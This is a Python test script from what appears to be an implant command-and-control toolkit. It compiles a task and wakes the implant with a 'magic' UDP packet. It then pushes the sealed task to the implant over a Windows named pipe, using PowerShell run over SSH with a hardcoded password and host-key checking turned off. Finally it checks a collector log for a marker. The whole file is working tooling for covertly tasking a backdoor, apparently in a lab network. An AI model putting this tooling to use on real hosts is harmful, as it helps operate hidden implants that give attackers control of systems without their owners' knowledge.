"""Deliver a follow-up task (UDP_SEND marker) over a named-pipe recv channel.
  pipe_server <pipe>   implant is the pipe SERVER -> we run a client, write env
  pipe_client <pipe>   implant is the pipe CLIENT -> we run a server, write env

Usage: python3 pipe_test.py <channel> <pipe> <marker-hex>
"""
import sys, time, base64, subprocess
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from swctl.bytecode import compile_program
from swctl.framing import seal_task

TARGET = "192.168.1.100"

def env_stream(prog):
    env = seal_task(prog)
    return len(env).to_bytes(2, "big") + env

def send_magic(dsl_text):
    from function_test.send import send_magic_udp, restart
    restart()
    time.sleep(2)
    send_magic_udp(dsl_text, 9999)

def ssh(cmd):
    subprocess.run(["sshpass","-p","ChangeMe123!","ssh","-o","StrictHostKeyChecking=no",
                    f"operator@{TARGET}", cmd], capture_output=True)

def check_marker(marker):
    time.sleep(3)
    try:
        lines = open("/tmp/udp_collector.log").read().splitlines()
    except FileNotFoundError:
        lines = []
    return [l for l in lines if marker in l]

def b64(b):
    return base64.b64encode(b).decode()

def main(argv):
    chan, pipe, marker = argv[0], argv[1], argv[2]
    prog = compile_program(f"UDP_SEND * * 192.168.1.50 9100 0x{marker} 0")
    envb = b64(env_stream(prog))
    print(f"[*] marker={marker} channel={chan} pipe={pipe}")

    if chan == "pipe_server":
        # implant is the server; connect as a client and write the env
        send_magic(f'PIPE_SERVER_RECV {pipe} "" 0')
        time.sleep(3)
        ps1 = (f"$p = New-Object System.IO.Pipes.NamedPipeClientStream('.', '{pipe}', "
               f"[System.IO.Pipes.PipeDirection]::Out);"
               f"$p.Connect(5000);"
               f"$b=[Convert]::FromBase64String('{envb}');"
               f"$p.Write($b,0,$b.Length);$p.Close();")
        ssh(f'powershell -NoProfile -Command "{ps1}"')
    elif chan == "pipe_client":
        # implant is the client; run a server that accepts and writes the env
        ps = (f"$p=New-Object System.IO.Pipes.NamedPipeServerStream('{pipe}',"
              f"[System.IO.Pipes.PipeDirection]::Out,1);"
              f"$p.WaitForConnection();"
              f"$b=[Convert]::FromBase64String('{envb}');"
              f"$p.Write($b,0,$b.Length);$p.Close();")
        proc = subprocess.Popen(
            ["sshpass","-p","ChangeMe123!","ssh","-o","StrictHostKeyChecking=no",
             f"operator@{TARGET}", f'powershell -NoProfile -Command "{ps}"'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)   # let the pipe server start and WaitForConnection
        send_magic(f'PIPE_CLIENT_RECV . {pipe} "" "" 0')
        proc.wait(timeout=20)
    else:
        print("unknown channel"); return 1

    hits = check_marker(marker)
    print("[*] MARKER_MATCH" if hits else "[*] MARKER_MISS")
    return 0

if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
